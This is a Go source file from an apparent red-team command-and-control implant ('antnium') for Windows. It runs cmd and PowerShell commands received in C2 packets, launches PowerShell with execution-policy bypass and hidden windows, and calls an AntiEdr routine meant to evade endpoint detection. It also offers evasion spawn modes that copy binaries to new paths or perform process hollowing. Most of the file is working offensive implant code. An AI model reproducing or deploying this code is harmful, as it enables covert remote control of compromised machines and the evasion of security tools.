// +build windows

package arch

/*
extern int InitSyscallsFromLdrpThunkSignature();
extern int Technique1();
*/
import "C"

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"io/ioutil"

	"github.com/dobin/antnium/pkg/inject"
	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
	"golang.org/x/text/encoding/charmap"
)

func AntiEdr() {
	C.InitSyscallsFromLdrpThunkSignature()
	C.Technique1()
}

// https://coolaj86.com/articles/golang-and-windows-and-admins-oh-my/
func Permissions() (bool, bool, error) {
	var sid *windows.SID

	// Although this looks scary, it is directly copied from the
	// official windows documentation. The Go API for this is a
	// direct wrap around the official C++ API.
	// See https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false, false, err
	}

	// This appears to cast a null pointer so I'm not sure why this
	// works, but this guy says it does and it Works for Me™:
	// https://github.com/golang/go/issues/28804#issuecomment-438838144
	token := windows.Token(0)

	member, err := token.IsMember(sid)
	if err != nil {
		return false, false, err
	}

	// Also note that an admin is _not_ necessarily considered
	// elevated.
	// For elevation see https://github.com/mozey/run-as-admin

	isElevated := token.IsElevated()
	isAdmin := member
	return isElevated, isAdmin, nil
}

func ExecOutputDecode(data []byte) string {
	d := charmap.CodePage850.NewDecoder()
	outDecoded, err := d.Bytes(data)
	if err != nil {
		// Fall back to stdout if decoding failed
		return string(data)
	} else {
		return string(outDecoded)
	}
}

func hollow(source, replace, name string, args []string) (int, []byte, []byte, int, error) {
	//log.Infof("Replacing %s with %s", source, replace)
	data, _ := ioutil.ReadFile(replace)
	return inject.RunPE64(data, source, name, strings.Join(args, " "))
}

func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
	stdOut = make([]byte, 0)
	stdErr = make([]byte, 0)
	pid = 0
	exitCode = 0
	err = nil

	processTimeout := 10 * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
	defer cancel()

	shellType, ok := packetArgument["shelltype"]
	if !ok {
		return stdOut, stdErr, pid, exitCode, fmt.Errorf("no argument 'shelltype' given")
	}

	spawnType, ok := packetArgument["spawnType"]
	if !ok {
		spawnType = "standard"
	}
	spawnData, ok := packetArgument["spawnData"]
	if !ok {
		spawnData = ""
	}

	// Extract effective executable path and arguments
	var executable string
	var args []string
	switch shellType {
	case "cmd":
		commandStr, ok := packetArgument["commandline"]
		if !ok {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
		}
		executable = `C:\windows\system32\cmd.exe`
		x := fmt.Sprintf(`cmd.exe /S /C "%s"`, commandStr)
		args = []string{x}

	case "powershell":
		commandStr, ok := packetArgument["commandline"]
		if !ok {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
		}

		executable = `C:\Windows\System32\WindowsPowershell\v1.0\`
		args = []string{"-ExecutionPolicy", "Bypass", "-C", commandStr}

	case "raw":
		executable, args, err = model.MakePacketArgumentFrom(packetArgument)
		if err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
		}

	default:
		return stdOut, stdErr, pid, exitCode, fmt.Errorf("shelltype %s unkown a", shellType)
	}

	// Always resolve full path, we may need it
	if filepath.Base(executable) == executable {
		if lp, err := exec.LookPath(executable); err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Could not resolve: %s", executable)
		} else {
			executable = lp
		}
	}

	/* Anti-EDR: copyFirst */
	if spawnType == "copyFirst" {
		destinationPath := spawnData
		if destinationPath == "" {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn copyfirst, but no path in spawnData found")
		}

		err = CopyFile(executable, destinationPath)
		if err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("error copying file: %s", err.Error())
		}
		// Destination is the new binary we execute
		executable = destinationPath
	}

	cmd := exec.CommandContext(ctx, executable, args...)
	/* Fix up windows exceptions in process parameter handling */
	switch shellType {
	case "cmd":
		// cmd.exe is different
		cmd.SysProcAttr = getSysProcAttrs()
		cmd.SysProcAttr.CmdLine = args[0]

	case "powershell":
		// powershell.exe is different
		cmd.SysProcAttr = getSysProcAttrs()

	case "raw":
		// Nothing

	default:
		return stdOut, stdErr, pid, exitCode, fmt.Errorf("shelltype %s unkown b", shellType)
	}

	log.Infof("Executing: %s %v", executable, args)

	// Inject?

	// See how we want to execute it
	if spawnType == "hollow" {
		// Perform Process Hollowing
		sourcePath := spawnData
		if sourcePath == "" {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow, but no path in spawnData found")
		}
		if _, err := os.Stat(sourcePath); errors.Is(err, os.ErrNotExist) {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow destination exe does not exist: %s", sourcePath)
		}

		name := filepath.Base(executable) // Need it without path
		pid, stdOut, stdErr, exitCode, err = hollow(sourcePath, executable, name, args)
		if err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Hollow error: %s", err)
		}
	} else {
		// Execute the (possibly copied) binary directly
		stdOut, err = cmd.Output()
		if err != nil {
			if exitError, ok := err.(*exec.ExitError); ok {
				stdErr = exitError.Stderr
				pid = exitError.Pid()
				exitCode = exitError.ProcessState.ExitCode()
			} else {
				pid = 0
				exitCode = cmd.ProcessState.ExitCode()

			}
		} else {
			pid = cmd.ProcessState.Pid()
			exitCode = cmd.ProcessState.ExitCode()
		}
	}

	return stdOut, stdErr, pid, exitCode, err
}

func getSysProcAttrs() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{
		HideWindow: true,
	}
}

func CopyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	if err != nil {
		return err
	}
	return out.Close()
}
